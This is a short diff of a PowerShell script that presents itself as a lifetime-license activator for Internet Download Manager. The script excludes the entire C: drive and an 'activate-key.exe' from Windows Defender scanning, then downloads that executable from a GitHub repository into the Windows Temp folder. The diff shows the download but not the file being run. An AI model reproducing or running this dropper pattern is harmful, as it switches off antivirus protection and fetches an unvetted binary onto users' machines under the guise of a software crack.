@@ -1,6 +1,6 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
-Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionPath "C:\","activate-key.exe"
 $url = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
 $outpath = "C:\Windows\Temp\activate-key.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
